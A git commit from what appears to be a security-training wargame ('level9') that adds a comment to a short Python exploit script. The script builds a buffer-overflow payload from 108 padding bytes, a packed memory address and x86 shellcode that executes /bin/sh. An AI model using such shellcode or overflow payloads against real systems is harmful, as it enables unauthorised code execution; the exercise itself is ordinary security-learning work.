f54931dded9e7c2b4957b6c1cba070cbfd5ee4ca
Azeddine El makkaoui <ael-makk@e1r8p5.1337.ma>
2022-10-05 12:27:19 +0100

    script docum

--- level9/script.py
+++ level9/script.py
@@ -1,5 +1,5 @@
 import struct 
 something = "AAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY" #108
-fant = struct.pack("I", 0x804a078)
+fant = struct.pack("I", 0x804a078) # dellaing with the derefrencing : the goal is to get edx register to point to the start of our shell code 
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 print something + fant + shellcode 
